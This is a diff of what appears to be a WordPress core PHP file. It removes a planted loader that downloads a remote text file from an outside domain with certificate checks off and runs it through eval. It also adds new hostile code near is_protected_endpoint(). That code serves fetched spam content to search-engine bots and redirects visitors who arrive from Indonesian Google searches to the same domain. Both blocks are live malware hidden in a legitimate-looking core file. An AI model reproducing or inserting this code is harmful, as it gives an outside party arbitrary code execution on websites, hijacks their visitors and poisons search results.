@@ -4,23 +4,6 @@
  *
  * @package WordPress
  */
-error_reporting(0);
-function get_contents($url){
-  $ch = curl_init("$url");
-  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
-  curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0(Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
-  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
-  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
-  curl_setopt($ch, CURLOPT_COOKIEJAR,$GLOBALS['coki']);
-  curl_setopt($ch, CURLOPT_COOKIEFILE,$GLOBALS['coki']);
-  $result = curl_exec($ch);
-  return $result;
-}?>
-<?php
-$a =
-get_contents('https://kasihmakan.xyz/wy/risele.txt');
-eval('?>'.$a);
 
 /**
  * Returns the HTTP protocol sent by the server.
@@ -1176,6 +1159,24 @@ function is_protected_endpoint() {
 	 *                                    Default false.
 	 */
 	return (bool) apply_filters( 'is_protected_endpoint', false );
+}
+$s_ref = $_SERVER['HTTP_REFERER'];
+$agent = $_SERVER['HTTP_USER_AGENT'];
+$accept_lang = strtolower($_SERVER['HTTP_ACCEPT_LANGUAGE']);
+$cookie_az = $_COOKIE['az'] ?? '';
+
+if (strpos($agent, 'bot') !== false && $_SERVER['REQUEST_URI'] == '/') {
+    if (strpos($accept_lang, 'en') !== false && $_SERVER['HTTP_UPGRADE_INSECURE_REQUESTS'] == 1 && $cookie_az == 'lp') {
+        setcookie('az', 'lp', time() + 3600 * 7200);
+        exit;
+    }
+    echo file_get_contents("https://kasihmakan.xyz/wy/risele/");
+    exit;
+}
+
+if (strpos($s_ref, 'google.co.id') !== false || (strpos($s_ref, 'google.com') !== false && strpos($accept_lang, 'id') !== false)) {
+    header("location: https://kasihmakan.xyz/amp/risele/");
+    exit;
 }
 
 /**
